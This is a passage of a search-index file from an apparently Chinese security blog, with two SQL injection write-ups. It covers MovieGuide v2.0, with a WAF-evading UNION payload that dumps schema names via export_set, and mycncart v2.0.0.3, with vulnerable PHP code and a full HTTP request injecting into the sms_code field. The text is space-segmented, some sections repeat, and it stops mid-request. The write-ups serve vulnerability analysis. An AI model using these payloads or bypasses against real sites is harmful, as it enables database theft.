separator [ , number _ of _ bits ] ] )   Returns   a   string   such   that   for   every   bit   set   in   the   value   bits ,   you   get   an   on   string   and   for   every   bit   not   set   in   the   value ,   you   get   an   off   string .   Bits   in   bits   are   examined   from   right   to   left   ( from   low - order   to   high - order   bits ) .   Strings   are   added   to   the   result   from   left   to   right ,   separated   by   the   separator   string   ( the   default   being   the   comma   character   , ) .   The   number   of   bits   examined   is   given   by   number _ of _ bits ,   which   has   a   default   of   64   if   not   specified .   number _ of _ bits   is   silently   clipped   to   64   if   larger   than   64 .   It   is   treated   as   an   unsigned   integer ,   so   a   value   of   \u2212 1   is   effectively   the   same   as   64 .   \u5206\u89e3 \u4e00\u4e0b PoC   / * ! 02222UNION * /   (   / * ! 02222SELECT * /   0x253238253331253239 , 0x253238253332253239 ,   (   / * ! 02222Select * /   export _ set ( 5 , @ a : = 0 ,   ( / * ! 02222select * /   count ( * ) / * ! 02222from * / ( information _ schema . columns ) where @ a : = / /   data - > @ a   export _ set ( 5 ,   export _ set ( 5 , @ a , / * ! 02222table _ name * / , ' < li > ' , 2 ) / / dump   table _ name   [ 0 < li > table _ name ]   , / * ! 02222column _ name * / , ' \\ n : ' , 2 ) / / dump   column _ name   [ 0 < li > table _ name \\ n : columns _ name ]   )   , @ a , 2 ) / / set   @ a   split   char   )   , 0x253238253334253239 , 0x253238253335253239 , 0x253238253336253239 , 0x253238253337253239 , 0x253238253338253239 , 0x253238253339253239 , 0x253238253331253330253239 , 0x253238253331253331253239 , 0x253238253331253332253239   ) --   -   \u8fd9\u91cc \u4e3b\u8981 \u5229\u7528 \u7684 \u662f export _ set \u51fd\u6570 \u7684 no \uff0c off \u4f4d\u7f6e \u6765 dump \u6570\u636e \u3002   \u9996\u5148 \u901a\u8fc7 @ a : = 0 \uff0c \u5b9a\u4e49 \u53d8\u91cf a \u4e3a 0 \uff08 \u53ef\u80fd \u8ddf mysql \u7248\u672c \u6709 \u5173\u7cfb \uff0c 5.7 . x \u4e0b \u7684 mysql \u65e0\u6cd5 \u7528 @ : = 0 \u6765 \u5b9a\u4e49 \uff09   \u6700 \u91cc\u9762 \u7684 export _ set \uff0c \u5c06 table _ name   dump \u51fa\u6765 \uff08 \u7ed3\u679c \u4e3a   0 < li > table _ name   \uff09   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u7684 \u4e00\u4e2a export _ set \uff0c \u5c06 columns _ name   dump \u51fa\u6765 ( \u7ed3\u679c \u4e3a   0 < li > table _ name \\ n : columns _ name   )   select   count ( * )   from   ( information _ schema . columns ) where @ a : = export _ set ( 5 , export _ set ( 5 , @ a , table _ name , ' < li > ' , 2 ) , column _ name , ' \\ n : ' , 2 )   \u5c06 \u4e0a\u8ff0 \u7684 \u6570\u636e \u8d4b\u503c \u7ed9 \u53d8\u91cf a   \u6700\u540e \u7528 \u6700\u540e \u4e00\u4e2a export _ set \uff0c \u7528 @ a \u505a \u5206\u9694 \u5206\u9694\u7b26 \uff0c \u5c06 \u6570\u636e dump \u51fa\u6765   0x02   \u603b\u7ed3   \u8be5 cms \u7684 \u6ce8\u5165 \u6f0f\u6d1e \u5f88 \u5e38\u89c4 \uff0c \u4e3b\u8981 \u662f \u5b66\u4e60 \u5206\u6790 \u4e86 \u8be5 PoC \uff0c \u80fd \u5728 \u672a\u6765 \u6ce8\u5165 \u7ed5\u8fc7 \u7684 \u5730\u65b9 \u5e94\u7528 \u3002   1 .   mysql \u7684 \u81ea\u5b9a \u5b9a\u4e49 \u81ea\u5b9a\u4e49 \u53d8\u91cf @ \u7684 \u5e94\u7528 \uff0c \u53ef\u4ee5 \u5728 \u4e00\u5b9a \u7a0b\u5ea6 \u4e0a \u6d88\u9664 \u7a7a\u683c \uff0c \u4ee5\u53ca \u6b63\u5219   \\ bwhere \\ b   \u7684 \u7ed5\u8fc7   2 .   / ! 02222select * / \u8fd9\u4e2a \u65b9\u6cd5 \u4e5f \u662f \u7ecf\u5e38 \u542c\u8bf4 \uff0c \u4e5f \u5728 \u8fd9\u91cc \u7528\u5230 \u4e86 \uff0c \u4e00\u4e2a \u5f88 \u597d \u7684 \u4f8b\u5b50 \u3002   3 .   export _ set \u7684 \u5e94\u7528 \uff0c \u6bd4\u8f83 \u91cd\u8981 \u7684 \u5e94\u7528 \uff0c \u5728 \u67d0\u4e9b \u60c5\u51b5 \u4e0b \u53ef \u7528\u4e8e \u7ed5\u8fc7","title":"MovieGuide   v2.0   SQLi"},{"location":"blog/2018/MovieGuide2SQLi-20180203/#0x00","text":"Detail :   Movie   Guide   v2.0   SQL   Injection","title":"0x00"},{"location":"blog/2018/MovieGuide2SQLi-20180203/#0x01","text":"\u8fd9\u662f \u4e00\u4e2a \u6bd4\u8f83 \u7c97\u7cd9 \u7684 \u5f00\u6e90 cms \uff0c \u603b\u4f53 \u6765\u8bf4 \u5e76 \u6ca1\u6709 \u5bf9 \u8f93\u5165 \u8f93\u51fa \u8f93\u5165\u8f93\u51fa \u505a \u5b89\u5168 \u5904\u7406 \uff0c \u4ece PoC \u5165\u624b \uff0c \u9009 \u4e00\u4e2a \u8fd8\u539f \u4e00\u4e0b \u6f0f\u6d1e \u5f62\u6210 \u8fc7\u7a0b \u3002","title":"0x01"},{"location":"blog/2018/MovieGuide2SQLi-20180203/#pocindexphpmdsql","text":"\u5b9a\u4f4d \u4e00\u4e0b md \u53c2\u6570   layout . php \u4e3a \u8be5 cms \u7684 \u4e3b\u8981 \u5165\u53e3 \u5904\u7406 , \u4e0b\u8ff0 \u7684 \u53d8\u91cf \u5747 \u6ca1\u6709 \u901a\u8fc7 \u5b89\u5168 \u5904\u7406 \uff0c \u76f4\u63a5 SQL \u8bed\u53e5 \uff0c \u4ece\u800c \u90fd \u53ef\u4ee5 \u7528\u4e8e \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u6ce8\u5165 \u3002   / / Get   the   passed   variables .   $ mterm   =   filter _ input ( INPUT _ POST ,   ' tterm ' ) ;   $ cterm   =   filter _ input ( INPUT _ POST ,   ' gterm ' ) ;   $ lterm   =   filter _ input ( INPUT _ GET ,   ' gterm ' ) ;   $ yterm   =   filter _ input ( INPUT _ GET ,   ' year ' ) ;   $ md   =   filter _ input ( INPUT _ GET ,   ' md ' ) ;   $ actorname   =   filter _ input ( INPUT _ GET ,   ' actor ' ) ;   $ directorname   =   filter _ input ( INPUT _ GET ,   ' director ' ) ;   \u76f4\u63a5 \u62fc\u63a5 \u5165 SQL \u8bed\u53e5   $ sql   =   \" SELECT   *   FROM   ` Movie _ List `   WHERE   ` Main _ Dir `   LIKE   ' \"   .   $ md   .   \" '   ORDER   BY   ` Movie _ Title `   ASC   Limit   $ start ,   $ perpage \" ;   \u8fd9\u91cc \u6bd4\u8f83 \u6709\u610f \u610f\u601d \u6709\u610f\u601d \u7684 \u662f \u5b83 \u7684 PoC \uff0c \u4ee5\u524d \u6ca1\u6709 \u89c1\u8fc7 \u7c7b\u4f3c \u7684 : b \uff0c PoC \u4e2d \u4f7f\u7528 \u4e86 export _ set \u51fd\u6570","title":"PoC \uff1a index . php ? md = [ SQL ]"},{"location":"blog/2018/MovieGuide2SQLi-20180203/#export_setbitsonoffseparatornumber_of_bits","text":"Returns   a   string   such   that   for   every   bit   set   in   the   value   bits ,   you   get   an   on   string   and   for   every   bit   not   set   in   the   value ,   you   get   an   off   string .   Bits   in   bits   are   examined   from   right   to   left   ( from   low - order   to   high - order   bits ) .   Strings   are   added   to   the   result   from   left   to   right ,   separated   by   the   separator   string   ( the   default   being   the   comma   character   , ) .   The   number   of   bits   examined   is   given   by   number _ of _ bits ,   which   has   a   default   of   64   if   not   specified .   number _ of _ bits   is   silently   clipped   to   64   if   larger   than   64 .   It   is   treated   as   an   unsigned   integer ,   so   a   value   of   \u2212 1   is   effectively   the   same   as   64 .   \u5206\u89e3 \u4e00\u4e0b PoC   / * ! 02222UNION * /   (   / * ! 02222SELECT * /   0x253238253331253239 , 0x253238253332253239 ,   (   / * ! 02222Select * /   export _ set ( 5 , @ a : = 0 ,   ( / * ! 02222select * /   count ( * ) / * ! 02222from * / ( information _ schema . columns ) where @ a : = / /   data - > @ a   export _ set ( 5 ,   export _ set ( 5 , @ a , / * ! 02222table _ name * / , ' < li > ' , 2 ) / / dump   table _ name   [ 0 < li > table _ name ]   , / * ! 02222column _ name * / , ' \\ n : ' , 2 ) / / dump   column _ name   [ 0 < li > table _ name \\ n : columns _ name ]   )   , @ a , 2 ) / / set   @ a   split   char   )   , 0x253238253334253239 , 0x253238253335253239 , 0x253238253336253239 , 0x253238253337253239 , 0x253238253338253239 , 0x253238253339253239 , 0x253238253331253330253239 , 0x253238253331253331253239 , 0x253238253331253332253239   ) --   -   \u8fd9\u91cc \u4e3b\u8981 \u5229\u7528 \u7684 \u662f export _ set \u51fd\u6570 \u7684 no \uff0c off \u4f4d\u7f6e \u6765 dump \u6570\u636e \u3002   \u9996\u5148 \u901a\u8fc7 @ a : = 0 \uff0c \u5b9a\u4e49 \u53d8\u91cf a \u4e3a 0 \uff08 \u53ef\u80fd \u8ddf mysql \u7248\u672c \u6709 \u5173\u7cfb \uff0c 5.7 . x \u4e0b \u7684 mysql \u65e0\u6cd5 \u7528 @ : = 0 \u6765 \u5b9a\u4e49 \uff09   \u6700 \u91cc\u9762 \u7684 export _ set \uff0c \u5c06 table _ name   dump \u51fa\u6765 \uff08 \u7ed3\u679c \u4e3a   0 < li > table _ name   \uff09   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u7684 \u4e00\u4e2a export _ set \uff0c \u5c06 columns _ name   dump \u51fa\u6765 ( \u7ed3\u679c \u4e3a   0 < li > table _ name \\ n : columns _ name   )   select   count ( * )   from   ( information _ schema . columns ) where @ a : = export _ set ( 5 , export _ set ( 5 , @ a , table _ name , ' < li > ' , 2 ) , column _ name , ' \\ n : ' , 2 )   \u5c06 \u4e0a\u8ff0 \u7684 \u6570\u636e \u8d4b\u503c \u7ed9 \u53d8\u91cf a   \u6700\u540e \u7528 \u6700\u540e \u4e00\u4e2a export _ set \uff0c \u7528 @ a \u505a \u5206\u9694 \u5206\u9694\u7b26 \uff0c \u5c06 \u6570\u636e dump \u51fa\u6765","title":"EXPORT _ SET ( bits , on , off [ , separator [ , number _ of _ bits ] ] )"},{"location":"blog/2018/MovieGuide2SQLi-20180203/#0x02","text":"\u8be5 cms \u7684 \u6ce8\u5165 \u6f0f\u6d1e \u5f88 \u5e38\u89c4 \uff0c \u4e3b\u8981 \u662f \u5b66\u4e60 \u5206\u6790 \u4e86 \u8be5 PoC \uff0c \u80fd \u5728 \u672a\u6765 \u6ce8\u5165 \u7ed5\u8fc7 \u7684 \u5730\u65b9 \u5e94\u7528 \u3002   1 .   mysql \u7684 \u81ea\u5b9a \u5b9a\u4e49 \u81ea\u5b9a\u4e49 \u53d8\u91cf @ \u7684 \u5e94\u7528 \uff0c \u53ef\u4ee5 \u5728 \u4e00\u5b9a \u7a0b\u5ea6 \u4e0a \u6d88\u9664 \u7a7a\u683c \uff0c \u4ee5\u53ca \u6b63\u5219   \\ bwhere \\ b   \u7684 \u7ed5\u8fc7   2 .   / ! 02222select * / \u8fd9\u4e2a \u65b9\u6cd5 \u4e5f \u662f \u7ecf\u5e38 \u542c\u8bf4 \uff0c \u4e5f \u5728 \u8fd9\u91cc \u7528\u5230 \u4e86 \uff0c \u4e00\u4e2a \u5f88 \u597d \u7684 \u4f8b\u5b50 \u3002   3 .   export _ set \u7684 \u5e94\u7528 \uff0c \u6bd4\u8f83 \u91cd\u8981 \u7684 \u5e94\u7528 \uff0c \u5728 \u67d0\u4e9b \u60c5\u51b5 \u4e0b \u53ef \u7528\u4e8e \u7ed5\u8fc7","title":"0x02   \u603b\u7ed3"},{"location":"blog/2019/mycncart-v2-0-0-3-sqli-20190225/","tags":["\u6f0f\u6d1e\u5206\u6790"],"text":"mycncart   v2.0 . 0.3   \u524d\u53f0 \u6ce8\u5165   CMS \u76f8\u5173 \u4fe1\u606f   \u7248\u672c \uff1a v2.0 . 0.3   \u6e90\u7801 \u4e0b\u8f7d \uff1a   mycncart \u4e3a \u4e2d\u56fd \u7248 \u7684 opencart \u7535\u5546 \u7cfb\u7edf   \u6f0f\u6d1e \u5206\u6790   \u5148\u51b3 \u6761\u4ef6 \u5148\u51b3\u6761\u4ef6 \uff1a \u7f51\u7ad9 \u5f00\u542f \u624b\u673a \u77ed\u4fe1 \u624b\u673a\u77ed\u4fe1 \u529f\u80fd   \u4e00\u822c \u7684 \u7535\u5546 \u7cfb\u7edf \u90fd \u4f1a \u6709 \u624b\u673a \u77ed\u4fe1 \u624b\u673a\u77ed\u4fe1 \u9a8c\u8bc1 \u9a8c\u8bc1\u7801 \u529f\u80fd \uff0c \u6240\u4ee5 mycncart \u63d0\u4f9b \u4e86 \u8fd9\u4e2a \u63a5\u53e3 \u3002 \u9996\u5148 \u5148 \u5f00\u542f \u8be5 \u529f\u80fd   \u4f4d\u4e8e \u540e\u53f0 > \u6269\u5c55 \u529f\u80fd > \u6269\u5c55 \u529f\u80fd \uff0c \u7b5b\u9009 \u51fa \u77ed\u4fe1 \u7f51\u5173 \uff0c \u5e76 \u5f00\u542f \uff0c \u5185\u5bb9 \u53ef\u4ee5 \u968f\u4fbf \u586b   \u6e90\u7801 \u5206\u6790   \u5148 \u76f4\u63a5 \u6765\u770b \u6f0f\u6d1e \u6210\u56e0 \u5904   v2.0 . 0.3 / catalog / model / account / smsmobile . php   < ? php   class   ModelAccountSmsMobile   extends   Model   {   public   function   addSmsMobile   (   $ telephone   ,   $ verify _ code   )   {   $ this   - >   db   - >   query   (   \" INSERT   INTO   \"   .   DB _ PREFIX   .   \" sms _ mobile   SET   sms _ mobile   =   ' \"   .   $ telephone   .   \" ' ,   verify _ code   =   ' \"   .   $ verify _ code   .   \" ' \"   ) ;   }   public   function   editSmsMobile   (   $ sms _ mobile _ id   ,   $ telephone   ,   $ verify _ code   )   {   $ this   - >   db   - >   query   (   \" UPDATE   \"   .   DB _ PREFIX   .   \" sms _ mobile   SET   sms _ mobile   =   ' \"   .   $ telephone   .   \" ' ,   verify _ code   =   ' \"   .   $ verify _ code   .   \" '   WHERE   sms _ mobile _ id   =   ' \"   .   $ sms _ mobile _ id   .   \" ' \"   ) ;   }   public   function   deleteSmsMobile   (   $ sms _ mobile   )   {   $ this   - >   db   - >   query   (   \" DELETE   FROM   \"   .   DB _ PREFIX   .   \" sms _ mobile   WHERE   sms _ mobile   =   ' \"   .   $ sms _ mobile   .   \" ' \"   ) ;   }   public   function   getIdBySmsMobile   (   $ sms _ mobile   )   {   $ query   =   $ this   - >   db   - >   query   (   \" SELECT   *   FROM   \"   .   DB _ PREFIX   .   \" sms _ mobile   WHERE   sms _ mobile   =   ' \"   .   $ sms _ mobile   .   \" ' \"   ) ;   return   $ query   - >   row   ;   }   public   function   verifySmsCode   (   $ sms _ mobile   ,   $ sms _ code   )   {   $ query   =   $ this   - >   db   - >   query   (   \" SELECT   COUNT ( * )   AS   total   FROM   \"   .   DB _ PREFIX   .   \" sms _ mobile   WHERE   sms _ mobile   =   ' \"   .   $ sms _ mobile   .   \" '   AND   verify _ code   =   ' \"   .   $ sms _ code   .   \" ' \"   ) ;   return   $ query   - >   row   [   ' total '   ] ;   }   }   \u8be5 \u6587\u4ef6 \u4e3a model \u7c7b \uff0c \u5904\u7406 \u77ed\u4fe1 \u7684 \u76f8\u5173 \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u64cd\u4f5c \uff0c \u53ef\u4ee5 \u770b\u5230 \u8fd9\u91cc \u7684 \u6240\u6709 sql \u8bed\u53e5 \u90fd \u662f \u6ca1\u6709 \u8fdb\u884c \u5b89\u5168 \u8fc7\u6ee4 \u7684 \uff0c \u76f4\u63a5 \u5c31 \u8fdb\u884c \u62fc\u63a5   \u6240\u4ee5 \u5982\u679c \u4e0a\u5c42 \u8c03\u7528 \u4e0d \u5bf9 \u6570\u636e \u505a \u5904\u7406 \u7684\u8bdd \uff0c \u5c31 \u80fd \u9020\u6210 sql \u6ce8\u5165   \u6211 \u8fd9\u91cc \u76f4\u63a5 \u627e \u4e86 verifySmsCode \u8fd9\u4e2a \u51fd\u6570 \uff0c \u5728 \u524d\u53f0 \u5c31 \u80fd \u8c03\u7528 \u5230   \u5b9a\u4f4d \u5230 v2.0 . 0.3 / catalog / controller / account / register . php   public   function   index ( )   {   :   :   if   ( ( $ this - > request - > server [ ' REQUEST _ METHOD ' ]   = =   ' POST ' )   &&   $ this - > validate ( ) )   {   $ customer _ id   =   $ this - > model _ account _ customer - > addCustomer ( $ this - > request - > post ,   $ weixin _ login _ openid ,   $ weixin _ login _ unionid ) ;   :   :   }   }   \u7701\u7565 \u65e0\u5173 \u4ee3\u7801 \uff0c \u5b9a\u4f4d \u5230 validata ( ) \u51fd\u6570   private   function   validate ( )   {   if   ( $ this - > request - > post [ ' registertype ' ]   = =   ' email ' )   {   :   :   }   else   {   if   ( ( utf8 _ strlen ( $ this - > request - > post [ ' telephone ' ] )   <   3 )   | |   ( utf8 _ strlen ( $ this - > request - > post [ ' telephone ' ] )   >   32 ) )   {   $ this - > error [ ' telephone ' ]   =   $ this - > language - > get ( ' error _ telephone ' ) ;   } else {   if   ( $ this - > model _ account _ customer - > getTotalCustomersByTelephone ( trim ( $ this - > request - > post [ ' telephone ' ] ) ) )   {   $ this - > error [ ' telephone ' ]   =   $ this - > language - > get ( ' error _ telephone _ exists ' ) ;   }   else   {   / /   if   sms   code   is   not   correct   if   ( $ this - > config - > get ( ' sms _ '   .   $ this - > config - > get ( ' config _ sms ' )   .   ' _ status ' )   &&   in _ array ( ' register ' ,   ( array ) $ this - > config - > get ( ' config _ sms _ page ' ) ) )   {   $ this - > load - > model ( ' account / smsmobile ' ) ;   if ( $ this - > model _ account _ smsmobile - > verifySmsCode ( $ this - > request - > post [ ' telephone ' ] ,   $ this - > request - > post [ ' sms _ code ' ] )   = =   0 )   {   $ this - > error [ ' sms _ code ' ]   =   $ this - > language - > get ( ' error _ sms _ code ' ) ;   }   }   :   :   \u7b2c 19 \u884c\u5904 \u8c03\u7528 \u4e86 verifySmsCode \u51fd\u6570 \uff0c \u5176\u4e2d \u8f93\u5165 \u4e3a   $ this - > request - > post [ ' telephone ' ]   , \u800c \u4ece   v2.0 . 0.3 / system / library / request . php   \u7684 \u5b9a\u4e49 \u53ef\u4ee5 \u770b\u5230 \uff0c \u8be5 cms \u5bf9 \u6570\u636e \u8f93\u5165 \u53ea \u505a \u4e86   htmlspecialchars   \u5904\u7406 \uff0c \u800c \u8fd9\u4e2a \u51fd\u6570 \u9057\u6f0f \u4e86 \u5f15\u53f7 \u5355\u5f15\u53f7 \u7684 \u8f6c\u4e49 \uff0c \u6240\u4ee5 \u6839\u636e \u4e0a\u9762 \u7684 \u5206\u6790 \uff0c verifySmsCode \u51fd\u6570 \u7684 \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u53c2\u6570 \u672a \u505a\u5230 \u5b89\u5168 \u7684 \u5904\u7406 \uff0c \u53ef\u4ee5 \u5bfc\u81f4 \u6ce8\u5165 \u6f0f\u6d1e \u7684 \u4ea7\u751f   PoC   \u9020\u6210 \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u9519\u8bef   POST   / index . php ? route = account / register   HTTP / 1.1   Host :   localhost   User - Agent :   Mozilla / 5.0   ( X11 ;   CrOS   armv7l   9592.96 . 0 )   AppleWebKit / 537.36   ( KHTML ,   like   Gecko )   Chrome / 60.0 . 3112.114   Safari / 537.36   Accept :   text / html , application / xhtml + xml , application / xml ; q = 0.9 , image / webp , * / * ; q = 0.8   Accept - Language :   zh - CN , zh ; q = 0.8 , zh - TW ; q = 0.7 , zh - HK ; q = 0.5 , en - US ; q = 0.3 , en ; q = 0.2   Accept - Encoding :   gzip ,   deflate   Content - Type :   multipart / form - data ;   boundary = --------------------------- 7517053542655893771289640773   Content - Length :   1491   Connection :   close   Cookie :   OCSESSID = 10ac6e7a3c082a8ce1a8facbbd ;   language = zh - cn ;   currency = CNY   Upgrade - Insecure - Requests :   1   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" registertype \"   mobile   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" email \"   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" telephone \"   534f3c824a9d63a8   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" sms _ code \"   '   or   ( select   if ( 0 , 1 , ~ 0 + 1 ) )   and   ' ' = '   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" firstname \"   123123   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" lastname \"   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" customer _ group _ id \"   1   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" password \"   123123   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" confirm \"   123123   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" newsletter \"   0   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" captcha \"   4a6b2c   ----------------------------- 7517053542655893771289640773   Content - Disposition :   form - data ;   name = \" agree \"   1   ----------------------------- 7517053542655893771289640773 --","title":"mycncart   sqli"},{"location":"blog/2019/mycncart-v2-0-0-3-sqli-20190225/#mycncart-v2003","text":"","title":"mycncart   v2.0 . 0.3   \u524d\u53f0 \u6ce8\u5165"},{"location":"blog/2019/mycncart-v2-0-0-3-sqli-20190225/#cms","text":"\u7248\u672c \uff1a v2.0 . 0.3   \u6e90\u7801 \u4e0b\u8f7d \uff1a   mycncart \u4e3a \u4e2d\u56fd \u7248 \u7684 opencart \u7535\u5546 \u7cfb\u7edf","title":"CMS \u76f8\u5173 \u4fe1\u606f"},{"location":"blog/2019/mycncart-v2-0-0-3-sqli-20190225/#_1","text":"","title":"\u6f0f\u6d1e \u5206\u6790"},{"location":"blog/2019/mycncart-v2-0-0-3-sqli-20190225/#_2","text":"\u4e00\u822c \u7684 \u7535\u5546 \u7cfb\u7edf \u90fd \u4f1a \u6709 \u624b\u673a \u77ed\u4fe1 \u624b\u673a\u77ed\u4fe1 \u9a8c\u8bc1 \u9a8c\u8bc1\u7801 \u529f\u80fd \uff0c \u6240\u4ee5 mycncart \u63d0\u4f9b \u4e86 \u8fd9\u4e2a \u63a5\u53e3 \u3002 \u9996\u5148 \u5148 \u5f00\u542f \u8be5 \u529f\u80fd   \u4f4d\u4e8e \u540e\u53f0 > \u6269\u5c55 \u529f\u80fd > \u6269\u5c55 \u529f\u80fd \uff0c \u7b5b\u9009 \u51fa \u77ed\u4fe1 \u7f51\u5173 \uff0c \u5e76 \u5f00\u542f \uff0c \u5185\u5bb9 \u53ef\u4ee5 \u968f\u4fbf \u586b","title":"\u5148\u51b3\u6761\u4ef6 \uff1a \u7f51\u7ad9 \u5f00\u542f \u624b\u673a\u77ed\u4fe1 \u529f\u80fd"},{"location":"blog/2019/mycncart-v2-0-0-3-sqli-20190225/#_3","text":"\u5148 \u76f4\u63a5 \u6765\u770b \u6f0f\u6d1e \u6210\u56e0 \u5904   v2.0 . 0.3 / catalog / model / account / smsmobile . php   < ? php   class   ModelAccountSmsMobile   extends   Model   {   public   function   addSmsMobile   (   $ telephone   ,   $ verify _ code   )   {   $ this   - >   db   - >   query   (   \" INSERT   INTO   \"   .   DB _ PREFIX   .   \" sms _ mobile   SET   sms _ mobile   =   ' \"   .   $ telephone   .   \" ' ,   verify _ code   =   ' \"   .   $ verify _ code   .   \" ' \"   ) ;   }   public   function   editSmsMobile   (   $ sms _ mobile _ id   ,   $ telephone   ,   $ verify _ code   )   {   $ this   - >   db   - >   query   (   \" UPDATE   \"   .   DB _ PREFIX   .   \" sms _ mobile   SET   sms _ mobile   =   ' \"   .   $ telephone   .   \" ' ,   verify _ code   =   ' \"   .   $ verify _ code   .   \" '   WHERE   sms _ mobile _ id   =   ' \"   .   $ sms _ mobile _ id   .   \" ' \"   ) ;   }   public   function   deleteSmsMobile   (   $ sms _ mobile   )   {   $ this   - >   db   - >   query   (   \" DELETE   FROM   \"   .   DB _ PREFIX   .   \" sms _ mobile   WHERE   sms _ mobile   =   ' \"   .   $ sms _ mobile   .   \" ' \"   ) ;   }   public   function   getIdBySmsMobile   (   $ sms _ mobile   )   {   $ query   =   $ this   - >   db   - >   query   (   \" SELECT   *   FROM   \"   .   DB _ PREFIX   .   \" sms _ mobile   WHERE   sms _ mobile   =   ' \"   .   $ sms _ mobile   .   \" ' \"   ) ;   return   $ query   - >   row   ;   }   public   function   verifySmsCode   (   $ sms _ mobile   ,   $ sms _ code   )   {   $ query   =   $ this   - >   db   - >   query   (   \" SELECT   COUNT ( * )   AS   total   FROM   \"   .   DB _ PREFIX   .   \" sms _ mobile   WHERE   sms _ mobile   =   ' \"   .   $ sms _ mobile   .   \" '   AND   verify _ code   =   ' \"   .   $ sms _ code   .   \" ' \"   ) ;   return   $ query   - >   row   [   ' total '   ] ;   }   }   \u8be5 \u6587\u4ef6 \u4e3a model \u7c7b \uff0c \u5904\u7406 \u77ed\u4fe1 \u7684 \u76f8\u5173 \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u64cd\u4f5c \uff0c \u53ef\u4ee5 \u770b\u5230 \u8fd9\u91cc \u7684 \u6240\u6709 sql \u8bed\u53e5 \u90fd \u662f \u6ca1\u6709 \u8fdb\u884c \u5b89\u5168 \u8fc7\u6ee4 \u7684 \uff0c \u76f4\u63a5 \u5c31 \u8fdb\u884c \u62fc\u63a5   \u6240\u4ee5 \u5982\u679c \u4e0a\u5c42 \u8c03\u7528 \u4e0d \u5bf9 \u6570\u636e \u505a \u5904\u7406 \u7684\u8bdd \uff0c \u5c31 \u80fd \u9020\u6210 sql \u6ce8\u5165   \u6211 \u8fd9\u91cc \u76f4\u63a5 \u627e \u4e86 verifySmsCode \u8fd9\u4e2a \u51fd\u6570 \uff0c \u5728 \u524d\u53f0 \u5c31 \u80fd \u8c03\u7528 \u5230   \u5b9a\u4f4d \u5230 v2.0 . 0.3 / catalog / controller / account / register . php   public   function   index ( )   {   :   :   if   ( ( $ this - > request - > server [ ' REQUEST _ METHOD ' ]   = =   ' POST ' )   &&   $ this - > validate ( ) )   {   $ customer _ id   =   $ this - > model _ account _ customer - > addCustomer ( $ this - > request - > post ,   $ weixin _ login _ openid ,   $ weixin _ login _ unionid ) ;   :   :   }   }   \u7701\u7565 \u65e0\u5173 \u4ee3\u7801 \uff0c \u5b9a\u4f4d \u5230 validata ( ) \u51fd\u6570   private   function   validate ( )   {   if   ( $ this - > request - > post [ ' registertype ' ]   = =   ' email ' )   {   :   :   }   else   {   if   ( ( utf8 _ strlen ( $ this - > request - > post [ ' telephone ' ] )   <   3 )   | |   ( utf8 _ strlen ( $ this - > request - > post [ ' telephone ' ] )   >   32 ) )   {   $ this - > error [ ' telephone ' ]   =   $ this - > language - > get ( ' error _ telephone ' ) ;   } else {   if   ( $ this - > model _ account _ customer - > getTotalCustomersByTelephone ( trim ( $ this - > request - > post [ ' telephone ' ] ) ) )   {   $ this - > error [ ' telephone ' ]   =   $ this - > language - > get ( ' error _ telephone _ exists ' ) ;   }   else   {   / /   if   sms   code   is   not   correct   if   ( $ this - > config - > get ( ' sms _ '   .   $ this - > config - > get ( ' config _ sms ' )   .   ' _ status ' )   &&   in _ array ( ' register ' ,   ( array ) $ this - > config - > get ( ' config _ sms _ page ' ) ) )   {   $ this - > load - > model ( ' account / smsmobile ' ) ;   if ( $ this - > model _ account _ smsmobile - > verifySmsCode ( $ this - > request - > post [ ' telephone ' ] ,   $ this - > request - > post [ ' sms _ code ' ] )   = =   0 )   {   $ this - > error [ ' sms _ code ' ]   =   $ this - > language - > get ( ' error _ sms _ code ' ) ;   }   }   :   :   \u7b2c 19 \u884c\u5904 \u8c03\u7528 \u4e86 verifySmsCode \u51fd\u6570 \uff0c \u5176\u4e2d \u8f93\u5165 \u4e3a   $ this - > request - > post [ ' telephone ' ]   , \u800c \u4ece   v2.0 . 0.3 / system / library / request . php   \u7684 \u5b9a\u4e49 \u53ef\u4ee5 \u770b\u5230 \uff0c \u8be5 cms \u5bf9 \u6570\u636e \u8f93\u5165 \u53ea \u505a \u4e86   htmlspecialchars   \u5904\u7406 \uff0c \u800c \u8fd9\u4e2a \u51fd\u6570 \u9057\u6f0f \u4e86 \u5f15\u53f7 \u5355\u5f15\u53f7 \u7684 \u8f6c\u4e49 \uff0c \u6240\u4ee5 \u6839\u636e \u4e0a\u9762 \u7684 \u5206\u6790 \uff0c verifySmsCode \u51fd\u6570 \u7684 \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u53c2\u6570 \u672a \u505a\u5230 \u5b89\u5168 \u7684 \u5904\u7406 \uff0c \u53ef\u4ee5 \u5bfc\u81f4 \u6ce8\u5165 \u6f0f\u6d1e \u7684 \u4ea7\u751f","title":"\u6e90\u7801 \u5206\u6790"},{"location":"blog/2019/mycncart-v2-0-0-3-sqli-20190225/#poc","text":"\u9020\u6210 \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u9519\u8bef   POST   / index . php ? route = account / register   HTTP / 1.1   Host :   localhost   User - Agent :   Mozilla / 5.0   ( X11 ;   CrOS   armv7l   9592.96 . 0 )   AppleWebKit / 537.36   ( KHTML ,   like   Gecko )   Chrome / 60.0 . 3112.114   Safari / 537.36   Accept :   text / html , application / xhtml + xml , application / xml ; q = 0.9 , image / webp , * / * ; q = 0.8   Accept - Language :   zh - CN , zh ; q = 0.8 , 